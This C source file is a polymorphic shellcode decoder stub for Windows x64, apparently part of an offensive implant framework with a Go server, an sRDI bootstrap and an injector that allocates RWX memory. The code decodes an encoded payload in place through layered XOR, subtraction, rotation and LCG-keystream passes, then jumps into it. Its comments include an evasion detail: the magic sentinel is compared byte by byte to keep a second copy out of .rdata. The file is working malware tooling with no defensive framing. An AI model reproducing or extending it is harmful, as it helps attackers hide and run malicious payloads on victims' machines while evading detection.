// wisp-poly decoder: position-independent shellcode decoder stub (plan P5).
//
// The Go side (server/internal/poly) maps this PE image and produces:
//   [34-byte jump stub][mapped decoder image][encoded payload]
// The stub passes (image base, cfg*) like the sRDI bootstrap; cfg lives in the
// .polycfg section and carries the payload location plus the decode pipeline
// (already in decode order). After in-place decoding we jump into the payload —
// the payload must be position-independent (our sRDI shellcode is).
//
// Requires an executable buffer (the injector allocates RWX).
#include <stdint.h>

typedef struct {
    char magic[8];       /* "POLYCFG\x01" */
    uint32_t version;    /* 1 */
    uint32_t payload_off;
    uint32_t payload_len;
    uint32_t passes;
    uint8_t op[4];       /* 1 xor8, 2 sub8, 3 ror8, 4 xor32-lcg */
    uint8_t pad[4];
    uint32_t key[4];
} poly_cfg;

_Static_assert(sizeof(poly_cfg) == 48, "poly_cfg layout is an ABI");

__attribute__((used, section(".polycfg"), aligned(4)))
volatile poly_cfg g_cfg = {{'P', 'O', 'L', 'Y', 'C', 'F', 'G', 1}, 1, 0, 0, 0,
                           {0, 0, 0, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}};

static int cfg_ok(const poly_cfg *c) {
    if (!c || c->version != 1) return 0;
    /* byte-wise compare keeps a second copy of the sentinel out of .rdata */
    return c->magic[0] == 'P' && c->magic[1] == 'O' && c->magic[2] == 'L' &&
           c->magic[3] == 'Y' && c->magic[4] == 'C' && c->magic[5] == 'F' &&
           c->magic[6] == 'G' && c->magic[7] == 1;
}

static void decode_pass(uint8_t *p, uint32_t n, uint8_t op, uint32_t key) {
    uint32_t i;
    switch (op) {
    case 1: /* xor with single-byte key */
        for (i = 0; i < n; i++) p[i] ^= (uint8_t)key;
        break;
    case 2: /* subtract single-byte key (encode added it) */
        for (i = 0; i < n; i++) p[i] -= (uint8_t)key;
        break;
    case 3: { /* ror by key&7 bits (encode rolled left) */
        unsigned r = key & 7u;
        if (!r) break;
        for (i = 0; i < n; i++) {
            uint8_t v = p[i];
            p[i] = (uint8_t)((v >> r) | (v << (8 - r)));
        }
        break;
    }
    case 4: { /* rolling u32 XOR keystream (LCG), symmetric */
        uint32_t s = key;
        for (i = 0; i < n; i++) {
            p[i] ^= (uint8_t)s;
            s = s * 1664525u + 1013904223u;
        }
        break;
    }
    default:
        break;
    }
}

/* Windows x64 ABI: rcx = image base, rdx = cfg* (set by the jump stub). */
int poly_entry(void *base, void *cfgv);

int poly_entry(void *base, void *cfgv) {
    poly_cfg *c = (poly_cfg *)cfgv;
    if (!cfg_ok(c)) return 2;
    uint8_t *p = (uint8_t *)base + c->payload_off;
    uint32_t pass;
    for (pass = 0; pass < c->passes && pass < 4; pass++) {
        decode_pass(p, c->payload_len, c->op[pass], c->key[pass]);
    }
    typedef int (*payload_fn)(void);
    ((payload_fn)(void *)p)();
    return 0;
}